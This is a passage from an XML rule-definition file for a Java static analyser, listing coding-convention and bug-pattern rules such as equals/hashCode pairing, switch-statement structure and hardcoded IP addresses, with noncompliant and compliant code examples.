            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public void evaluate(int operator) {
            // Do some computation...
            evaluateAdd();
            }

            private void evaluateAdd() {
            int a = stack.pop();
            int b = stack.pop();
            int result = a + b;
            stack.push(result);
            }
            &lt;/pre&gt;
        </description>
        <tag>bad-practice</tag>
    </rule>

    <rule key='S120' priority='MINOR'>
        <configKey>S120</configKey>
        <name>Package names should comply with a naming convention</name>
        <description>
            &lt;p&gt;Shared coding conventions allow teams to collaborate efficiently. This rule checks that all package
            names match a provided regular expression.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;p&gt;With the default regular expression &lt;code&gt;^[a-z_]+(\.[a-z_][a-z0-9_]*)*$&lt;/code&gt;:&lt;/p&gt;
            &lt;pre&gt;
            package org.exAmple; // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            package org.example;
            &lt;/pre&gt;
        </description>
        <tag>convention</tag>
        <param>
            <key>format</key>
            <description>Regular expression used to check the package names against.</description>
            <defaultValue>^[a-z_]+(\.[a-z_][a-z0-9_]*)*$</defaultValue>
            <type>STRING</type>
        </param>
    </rule>

    <rule key='S1201' priority='MAJOR'>
        <configKey>S1201</configKey>
        <name>&quot;equals&quot; method overrides should accept &quot;Object&quot; parameters</name>
        <description>
            &lt;p&gt;&quot;equals&quot; as a method name should be used exclusively to override &lt;code&gt;Object.equals(Object)&lt;/code&gt;
            to prevent any confusion.&lt;/p&gt;
            &lt;p&gt;It is tempting to overload the method to take a specific class instead of &lt;code&gt;Object&lt;/code&gt;
            as parameter, to save the class comparison check.
            However, this will not work as expected when that is the only override.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            class MyClass {
            private int foo = 1;

            public boolean equals(MyClass o) { // Noncompliant; does not override Object.equals(Object)
            return o != null &amp;amp;&amp;amp; o.foo == this.foo;
            }

            public static void main(String[] args) {
            MyClass o1 = new MyClass();
            Object o2 = new MyClass();
            System.out.println(o1.equals(o2)); // Prints &quot;false&quot; because o2 an Object not a MyClass
            }
            }

            class MyClass2 {
            public boolean equals(MyClass2 o) { // Ignored; `boolean equals(Object)` also present
            //..
            }

            public boolean equals(Object o) {
            //...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            class MyClass {
            private int foo = 1;

            @Override
            public boolean equals(Object o) {
            if (this == o) {
            return true;
            }
            if (o == null || getClass() != o.getClass()) {
            return false;
            }

            MyClass other = (MyClass)o;
            return this.foo == other.foo;
            }

            /* ... */
            }

            class MyClass2 {
            public boolean equals(MyClass2 o) {
            //..
            }

            public boolean equals(Object o) {
            //...
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>suspicious</tag>
    </rule>

    <rule key='S1206' priority='MINOR'>
        <configKey>S1206</configKey>
        <name>&quot;equals(Object obj)&quot; and &quot;hashCode()&quot; should be overridden in pairs</name>
        <description>
            &lt;p&gt;According to the Java Language Specification, there is a contract between &lt;code&gt;equals(Object)&lt;/code&gt;
            and &lt;code&gt;hashCode()&lt;/code&gt;:&lt;/p&gt;
            &lt;blockquote&gt;
            &lt;p&gt;If two objects are equal according to the &lt;code&gt;equals(Object)&lt;/code&gt; method, then
            calling the &lt;code&gt;hashCode&lt;/code&gt; method on each of the two
            objects must produce the same integer result. &lt;/p&gt;
            &lt;p&gt;It is not required that if two objects are unequal according to the &lt;code&gt;equals(java.lang.Object)&lt;/code&gt;
            method, then calling the
            &lt;code&gt;hashCode&lt;/code&gt; method on each of the two objects must produce distinct integer results.&lt;/p&gt;
            &lt;p&gt;However, the programmer should be aware that producing distinct integer results for unequal objects
            may improve the performance of
            hashtables.&lt;/p&gt;
            &lt;/blockquote&gt;
            &lt;p&gt;In order to comply with this contract, those methods should be either both inherited, or both
            overridden.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            class MyClass { // Noncompliant - should also override &quot;hashCode()&quot;

            @Override
            public boolean equals(Object obj) {
            /* ... */
            }

            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            class MyClass { // Compliant

            @Override
            public boolean equals(Object obj) {
            /* ... */
            }

            @Override
            public int hashCode() {
            /* ... */
            }

            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/581.html&quot;&gt;MITRE, CWE-581&lt;/a&gt;
            - Object Model Violation: Just One of Equals and Hashcode Defined
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/7DVGBQ&quot;&gt;CERT, MET09-J.&lt;/a&gt; -
            Classes that define an equals() method must also define a
            hashCode() method &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
    </rule>

    <rule key='S1210' priority='MINOR'>
        <configKey>S1210</configKey>
        <name>&quot;equals(Object obj)&quot; should be overridden along with the &quot;compareTo(T obj)&quot; method
        </name>
        <description>
            &lt;p&gt;According to the Java &lt;code&gt;Comparable.compareTo(T o)&lt;/code&gt; documentation:&lt;/p&gt;
            &lt;blockquote&gt;
            &lt;p&gt;It is strongly recommended, but not strictly required that &lt;code&gt;(x.compareTo(y)==0) ==
            (x.equals(y))&lt;/code&gt;.&lt;/p&gt;
            &lt;p&gt;Generally speaking, any class that implements the Comparable interface and violates this condition
            should clearly indicate this fact.&lt;/p&gt;
            &lt;p&gt;The recommended language is &quot;Note: this class has a natural ordering that is inconsistent with
            equals.&quot; &lt;/p&gt;
            &lt;/blockquote&gt;
            &lt;p&gt;If this rule is violated, weird and unpredictable failures can occur.&lt;/p&gt;
            &lt;p&gt;For example, in Java 5 the &lt;code&gt;PriorityQueue.remove()&lt;/code&gt; method relied on &lt;code&gt;compareTo()&lt;/code&gt;,
            but since Java 6 it has relied on
            &lt;code&gt;equals()&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Foo implements Comparable&amp;lt;Foo&amp;gt; {
            @Override
            public int compareTo(Foo foo) { /* ... */ } // Noncompliant as the equals(Object obj) method is not
            overridden
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class Foo implements Comparable&amp;lt;Foo&amp;gt; {
            @Override
            public int compareTo(Foo foo) { /* ... */ } // Compliant

            @Override
            public boolean equals(Object obj) { /* ... */ }
            }
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S1214' priority='CRITICAL'>
        <configKey>S1214</configKey>
        <name>Constants should not be defined in interfaces</name>
        <description>
            &lt;p&gt;According to Joshua Bloch, author of &quot;Effective Java&quot;:&lt;/p&gt;
            &lt;blockquote&gt;
            &lt;p&gt;The constant interface pattern is a poor use of interfaces. &lt;/p&gt;
            &lt;p&gt;That a class uses some constants internally is an implementation detail.&lt;/p&gt;
            &lt;p&gt;Implementing a constant interface causes this implementation detail to leak into the class's
            exported API. It is of no consequence to the users
            of a class that the class implements a constant interface. In fact, it may even confuse them. Worse, it
            represents a commitment: if in a future
            release the class is modified so that it no longer needs to use the constants, it still must implement the
            interface to ensure binary compatibility.
            If a nonfinal class implements a constant interface,&lt;/p&gt;
            &lt;p&gt;all of its subclasses will have their namespaces polluted by the constants in the interface.&lt;/p&gt;
            &lt;/blockquote&gt;
            &lt;p&gt;This rule raises an issue when an interface consists solely of fields, without any other members.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            interface Status { // Noncompliant
            int OPEN = 1;
            int CLOSED = 2;
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public enum Status { // Compliant
            OPEN,
            CLOSED;
            }
            &lt;/pre&gt;
            &lt;p&gt;or&lt;/p&gt;
            &lt;pre&gt;
            public final class Status { // Compliant
            public static final int OPEN = 1;
            public static final int CLOSED = 2;
            }
            &lt;/pre&gt;
        </description>
        <tag>bad-practice</tag>
    </rule>

    <rule key='S1215' priority='CRITICAL'>
        <configKey>S1215</configKey>
        <name>Execution of the Garbage Collector should be triggered only by the JVM</name>
        <description>
            &lt;p&gt;Calling &lt;code&gt;System.gc()&lt;/code&gt; or &lt;code&gt;Runtime.getRuntime().gc()&lt;/code&gt;
            is a bad idea for a simple reason: there is no way to know exactly what
            will be done under the hood by the JVM because the behavior will depend on its vendor, version and options:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; Will the whole application be frozen during the call? &lt;/li&gt;
            &lt;li&gt; Is the &lt;code&gt;-XX:DisableExplicitGC&lt;/code&gt; option activated? &lt;/li&gt;
            &lt;li&gt; Will the JVM simply ignore the call? &lt;/li&gt;
            &lt;li&gt; ... &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;Like for &lt;code&gt;System.gc()&lt;/code&gt;, there is no reason to manually call &lt;code&gt;runFinalization()&lt;/code&gt;
            to force the call of finalization methods of
            any objects pending finalization.&lt;/p&gt;
            &lt;p&gt;An application relying on these unpredictable methods is also unpredictable and therefore broken.
            The task of running the garbage collector and
            calling &lt;code&gt;finalize()&lt;/code&gt; methods should be left exclusively to the JVM.&lt;/p&gt;
        </description>
        <tag>bad-practice</tag>
        <tag>unpredictable</tag>
    </rule>

    <rule key='S1217' priority='MAJOR'>
        <configKey>S1217</configKey>
        <name>&quot;Thread.run()&quot; should not be called directly</name>
        <description>
            &lt;p&gt;The purpose of the &lt;code&gt;Thread.run()&lt;/code&gt; method is to execute code in a separate,
            dedicated thread. Calling this method directly doesn't make
            sense because it causes its code to be executed in the current thread. &lt;/p&gt;
            &lt;p&gt;To get the expected behavior, call the &lt;code&gt;Thread.start()&lt;/code&gt; method instead.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Thread myThread = new Thread(runnable);
            myThread.run(); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            Thread myThread = new Thread(runnable);
            myThread.start(); // Compliant
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/572.html&quot;&gt;MITRE, CWE-572&lt;/a&gt;
            - Call to Thread run() instead of start() &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/6DdGBQ&quot;&gt;CERT THI00-J.&lt;/a&gt; -
            Do not invoke Thread.run() &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>multi-threading</tag>
    </rule>

    <rule key='S1219' priority='BLOCKER'>
        <configKey>S1219</configKey>
        <name>&quot;switch&quot; statements should not contain non-case labels</name>
        <description>
            &lt;p&gt;Even if it is legal, mixing case and non-case labels in the body of a switch statement is very
            confusing and can even be the result of a typing
            error.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            switch (day) {
            case MONDAY:
            case TUESDAY:
            WEDNESDAY: // Noncompliant; syntactically correct, but behavior is not what's expected
            doSomething();
            break;
            ...
            }

            switch (day) {
            case MONDAY:
            break;
            case TUESDAY:
            foo:for(int i = 0 ; i &amp;lt; X ; i++) { // Noncompliant; the code is correct and behaves as expected but
            is barely readable
            /* ... */
            break foo; // this break statement doesn't relate to the nesting case TUESDAY
            /* ... */
            }
            break;
            /* ... */
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            switch (day) {
            case MONDAY:
            case TUESDAY:
            case WEDNESDAY:
            doSomething();
            break;
            ...
            }

            switch (day) {
            case MONDAY:
            break;
            case TUESDAY:
            compute(args); // put the content of the labelled &quot;for&quot; statement in a dedicated method
            break;

            /* ... */
            }
            &lt;/pre&gt;
        </description>
        <tag>suspicious</tag>
    </rule>

    <rule key='S1220' priority='MINOR'>
        <configKey>S1220</configKey>
        <name>The default unnamed package should not be used</name>
        <description>
            &lt;p&gt;According to the Java Language Specification:&lt;/p&gt;
            &lt;blockquote&gt;
            &lt;p&gt;Unnamed packages are provided by the Java platform principally for convenience when developing
            small or temporary applications or when just
            beginning development.&lt;/p&gt;
            &lt;/blockquote&gt;
            &lt;p&gt;To enforce this best practice, classes located in default package can no longer be accessed from
            named ones since Java 1.4.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClass { /* ... */ }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            package org.example;

            public class MyClass{ /* ... */ }
            &lt;/pre&gt;
        </description>
        <tag>convention</tag>
    </rule>

    <rule key='S1221' priority='MAJOR'>
        <configKey>S1221</configKey>
        <name>Methods should not be named &quot;tostring&quot;, &quot;hashcode&quot; or &quot;equal&quot;</name>
        <description>
            &lt;p&gt;Naming a method &lt;code&gt;tostring&lt;/code&gt;, &lt;code&gt;hashcode&lt;/code&gt; or &lt;code&gt;equal&lt;/code&gt;
            is either:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; A bug in the form of a typo. Overriding &lt;code&gt;toString&lt;/code&gt;, &lt;code&gt;Object.hashCode()&lt;/code&gt;
            (note the camelCasing) or
            &lt;code&gt;Object.equals&lt;/code&gt; (note the 's' on the end) was meant, and the application does not
            behave as expected. &lt;/li&gt;
            &lt;li&gt; Done on purpose. The name however will confuse every other developer, who may not notice the
            naming difference, or who will think it is a bug.
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;In both cases, the method should be renamed.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public int hashcode() { /* ... */ } // Noncompliant

            public String tostring() { /* ... */ } // Noncompliant

            public boolean equal(Object obj) { /* ... */ } // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            @Override
            public int hashCode() { /* ... */ }

            @Override
            public String toString() { /* ... */ }

            @Override
            public boolean equals(Object obj) { /* ... */ }
            &lt;/pre&gt;
        </description>
        <tag>pitfall</tag>
    </rule>

    <rule key='S1223' priority='MAJOR'>
        <configKey>S1223</configKey>
        <name>Non-constructor methods should not have the same name as the enclosing class</name>
        <description>
            &lt;p&gt;Having a class and some of its methods sharing the same name is misleading, and leaves others to
            wonder whether it was done that way on purpose, or
            was the methods supposed to be a constructor.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Foo {
            public Foo() {...}
            public void Foo(String label) {...} // Noncompliant
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class Foo {
            public Foo() {...}
            public void foo(String label) {...} // Compliant
            }
            &lt;/pre&gt;
        </description>
        <tag>pitfall</tag>
    </rule>

    <rule key='S1226' priority='MINOR'>
        <configKey>S1226</configKey>
        <name>Method parameters, caught exceptions and foreach variables' initial values should not be ignored</name>
        <description>
            &lt;p&gt;While it is technically correct to assign to parameters from within method bodies, doing so before
            the parameter value is read is likely a bug.
            Instead, initial values of parameters, caught exceptions, and foreach parameters should be, if not treated
            as &lt;code&gt;final&lt;/code&gt;, then at least read
            before reassignment.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void doTheThing(String str, int i, List&amp;lt;String&amp;gt; strings) {
            str = Integer.toString(i); // Noncompliant

            for (String s : strings) {
            s = &quot;hello world&quot;; // Noncompliant
            }
            }
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S125' priority='MAJOR'>
        <configKey>S125</configKey>
        <name>Sections of code should not be commented out</name>
        <description>
            &lt;p&gt;Programmers should not comment out code as it bloats programs and reduces readability.&lt;/p&gt;
            &lt;p&gt;Unused code should be deleted and can be retrieved from source control history if required.&lt;/p&gt;
        </description>
        <tag>unused</tag>
    </rule>

    <rule key='S1264' priority='MINOR'>
        <configKey>S1264</configKey>
        <name>A &quot;while&quot; loop should be used instead of a &quot;for&quot; loop</name>
        <description>
            &lt;p&gt;When only the condition expression is defined in a &lt;code&gt;for&lt;/code&gt; loop, and the
            initialization and increment expressions are missing, a
            &lt;code&gt;while&lt;/code&gt; loop should be used instead to increase readability. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            for (;condition;) { /*...*/ }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            while (condition) { /*...*/ }
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
    </rule>

    <rule key='S127' priority='MAJOR'>
        <configKey>S127</configKey>
        <name>&quot;for&quot; loop stop conditions should be invariant</name>
        <description>
            &lt;p&gt;A &lt;code&gt;for&lt;/code&gt; loop stop condition should test the loop counter against an
            invariant value (i.e. one that is true at both the beginning and
            ending of every loop iteration). Ideally, this means that the stop condition is set to a local variable just
            before the loop begins. &lt;/p&gt;
            &lt;p&gt;Stop conditions that are not invariant are slightly less efficient, as well as being difficult to
            understand and maintain, and likely lead to the
            introduction of errors in the future.&lt;/p&gt;
            &lt;p&gt;This rule tracks three types of non-invariant stop conditions:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; When the loop counters are updated in the body of the &lt;code&gt;for&lt;/code&gt; loop &lt;/li&gt;
            &lt;li&gt; When the stop condition depend upon a method call &lt;/li&gt;
            &lt;li&gt; When the stop condition depends on an object property, since such properties could change during
            the execution of the loop. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            for (int i = 0; i &amp;lt; 10; i++) {
            ...
            i = i - 1; // Noncompliant; counter updated in the body of the loop
            ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            for (int i = 0; i &amp;lt; 10; i++) {...}
            &lt;/pre&gt;
        </description>
        <tag>pitfall</tag>
    </rule>

    <rule key='S128' priority='BLOCKER'>
        <configKey>S128</configKey>
        <name>Switch cases should end with an unconditional &quot;break&quot; statement</name>
        <description>
            &lt;p&gt;When the execution is not explicitly terminated at the end of a switch case, it continues to
            execute the statements of the following case. While
            this is sometimes intentional, it often is a mistake which leads to unexpected behavior. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            switch (myVariable) {
            case 1:
            foo();
            break;
            case 2: // Both 'doSomething()' and 'doSomethingElse()' will be executed. Is it on purpose ?
            doSomething();
            default:
            doSomethingElse();
            break;
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            switch (myVariable) {
            case 1:
            foo();
            break;
            case 2:
            doSomething();
            break;
            default:
            doSomethingElse();
            break;
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;This rule is relaxed in the following cases:&lt;/p&gt;
            &lt;pre&gt;
            switch (myVariable) {
            case 0: // Empty case used to specify the same behavior for a group of cases.
            case 1:
            doSomething();
            break;
            case 2: // Use of return statement
            return;
            case 3: // Use of throw statement
            throw new IllegalStateException();
            case 4: // Use of continue statement
            continue;
            default: // For the last case, use of break statement is optional
            doSomethingElse();
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/484.html&quot;&gt;MITRE, CWE-484&lt;/a&gt;
            - Omitted Break Statement in Switch &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/ldYxBQ&quot;&gt;CERT, MSC17-C.&lt;/a&gt; -
            Finish every set of statements associated with a case label with a
            break statement &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/1DdGBQ&quot;&gt;CERT, MSC52-J.&lt;/a&gt; -
            Finish every set of statements associated with a case label with a
            break statement &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>suspicious</tag>
    </rule>

    <rule key='S1301' priority='MINOR'>
        <configKey>S1301</configKey>
        <name>&quot;switch&quot; statements should have at least 3 &quot;case&quot; clauses</name>
        <description>
            &lt;p&gt;&lt;code&gt;switch&lt;/code&gt; statements are useful when there are many different cases depending
            on the value of the same expression.&lt;/p&gt;
            &lt;p&gt;For just one or two cases however, the code will be more readable with &lt;code&gt;if&lt;/code&gt;
            statements.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            switch (variable) {
            case 0:
            doSomething();
            break;
            default:
            doSomethingElse();
            break;
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            if (variable == 0) {
            doSomething();
            } else {
            doSomethingElse();
            }
            &lt;/pre&gt;
        </description>
        <tag>bad-practice</tag>
    </rule>

    <rule key='S131' priority='CRITICAL'>
        <configKey>S131</configKey>
        <name>&quot;switch&quot; statements should have &quot;default&quot; clauses</name>
        <description>
            &lt;p&gt;The requirement for a final &lt;code&gt;default&lt;/code&gt; clause is defensive programming. The
            clause should either take appropriate action, or contain a
            suitable comment as to why no action is taken.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            switch (param) { //missing default clause
            case 0:
            doSomething();
            break;
            case 1:
            doSomethingElse();
            break;
            }

            switch (param) {
            default: // default clause should be the last one
            error();
            break;
            case 0:
            doSomething();
            break;
            case 1:
            doSomethingElse();
            break;
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            switch (param) {
            case 0:
            doSomething();
            break;
            case 1:
            doSomethingElse();
            break;
            default:
            error();
            break;
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;If the &lt;code&gt;switch&lt;/code&gt; parameter is an &lt;code&gt;Enum&lt;/code&gt; and if all the
            constants of this enum are used in the &lt;code&gt;case&lt;/code&gt; statements,
            then no &lt;code&gt;default&lt;/code&gt; clause is expected.&lt;/p&gt;
            &lt;p&gt;Example:&lt;/p&gt;
            &lt;pre&gt;
            public enum Day {
            SUNDAY, MONDAY
            }
            ...
            switch(day) {
            case SUNDAY:
            doSomething();
            break;
            case MONDAY:
            doSomethingElse();
            break;
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/478.html&quot;&gt;MITRE, CWE-478&lt;/a&gt;
            - Missing Default Case in Switch Statement &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/RtYxBQ&quot;&gt;CERT, MSC01-C.&lt;/a&gt; -
            Strive for logical completeness &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
    </rule>

    <rule key='S1313' priority='MINOR'>
        <configKey>S1313</configKey>
        <name>Using hardcoded IP addresses is security-sensitive</name>
        <description>
            &lt;p&gt;Hardcoding IP addresses is security-sensitive. It has led in the past to the following
            vulnerabilities:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901&quot;&gt;CVE-2006-5901&lt;/a&gt;
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725&quot;&gt;CVE-2005-3725&lt;/a&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;Today's services have an ever-changing architecture due to their scaling and redundancy needs. It
            is a mistake to think that a service will always
            have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have
            an impact on the product development,
            delivery, and deployment:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; The developers will have to do a rapid fix every time this happens, instead of having an
            operation team change a configuration file. &lt;/li&gt;
            &lt;li&gt; It misleads to use the same address in every environment (dev, sys, qa, prod). &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;Last but not least it has an effect on application security. Attackers might be able to decompile
            the code and thereby discover a potentially
            sensitive address. They can perform a Denial of Service attack on the service, try to get access to the
            system, or try to spoof the IP address to
            bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address
            solving the issue will take more time, which
            will increase an attack's impact.&lt;/p&gt;
            &lt;h2&gt;Ask Yourself Whether&lt;/h2&gt;
            &lt;p&gt;The disclosed IP address is sensitive, e.g.:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; Can give information to an attacker about the network topology. &lt;/li&gt;
            &lt;li&gt; It's a personal (assigned to an identifiable person) IP address. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;There is a risk if you answered yes to any of these questions.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;p&gt;Don't hard-code the IP address in the source code, instead make it configurable with environment
            variables, configuration files, or a similar
            approach. Alternatively, if confidentially is not required a domain name can be used since it allows to
            change the destination quickly without having
            to rebuild the software.&lt;/p&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;pre&gt;
            String ip = &quot;192.168.12.42&quot;; // Sensitive
            Socket socket = new Socket(ip, 6667);
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            String ip = System.getenv(&quot;IP_ADDRESS&quot;); // Compliant
            Socket socket = new Socket(ip, 6667);
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;No issue is reported for the following cases because they are not considered sensitive:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) &lt;/li&gt;
            &lt;li&gt; Broadcast address 255.255.255.255 &lt;/li&gt;
            &lt;li&gt; Non routable address 0.0.0.0 &lt;/li&gt;
            &lt;li&gt; Strings of the form &lt;code&gt;2.5.&amp;lt;number&amp;gt;.&amp;lt;number&amp;gt;&lt;/code&gt; as
            they &lt;a href=&quot;http://www.oid-info.com/introduction.htm&quot;&gt;often match
            Object Identifiers&lt;/a&gt; (OID). &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure&quot;&gt;OWASP
            Top 10 2017 Category A3&lt;/a&gt; - Sensitive Data Exposure
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/OjdGBQ&quot;&gt;CERT, MSC03-J.&lt;/a&gt; -
            Never hard code sensitive information &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>owasp-a3</tag>
        <securityStandards>
            <OWASP>A3</OWASP>
        </securityStandards>
    </rule>

    <rule key='S1317' priority='MAJOR'>
        <configKey>S1317</configKey>
        <name>&quot;StringBuilder&quot; and &quot;StringBuffer&quot; should not be instantiated with a character</name>
        <description>
            &lt;p&gt;Instantiating a &lt;code&gt;StringBuilder&lt;/code&gt; or a &lt;code&gt;StringBuffer&lt;/code&gt;
            with a character is misleading because most Java developers would expect
            the character to be the initial value of the &lt;code&gt;StringBuffer&lt;/code&gt;. &lt;/p&gt;
            &lt;p&gt;What actually happens is that the int representation of the character is used to determine the
            initial size of the &lt;code&gt;StringBuffer&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            StringBuffer foo = new StringBuffer('x'); //equivalent to StringBuffer foo = new StringBuffer(120);
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            StringBuffer foo = new StringBuffer(&quot;x&quot;);
            &lt;/pre&gt;
        </description>
        <tag>pitfall</tag>
    </rule>

    <rule key='S1319' priority='MINOR'>
        <configKey>S1319</configKey>
        <name>Declarations should use Java collection interfaces such as &quot;List&quot; rather than specific
            implementation classes such as &quot;LinkedList&quot;
        </name>
        <description>
            &lt;p&gt;The purpose of the Java Collections API is to provide a well defined hierarchy of interfaces in
            order to hide implementation details.&lt;/p&gt;
            &lt;p&gt;Implementing classes must be used to instantiate new collections, but the result of an
            instantiation should ideally be stored in a variable whose
            type is a Java Collection interface.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when an implementation class:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; is returned from a &lt;code&gt;public&lt;/code&gt; method. &lt;/li&gt;
            &lt;li&gt; is accepted as an argument to a &lt;code&gt;public&lt;/code&gt; method. &lt;/li&gt;
            &lt;li&gt; is exposed as a &lt;code&gt;public&lt;/code&gt; member. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
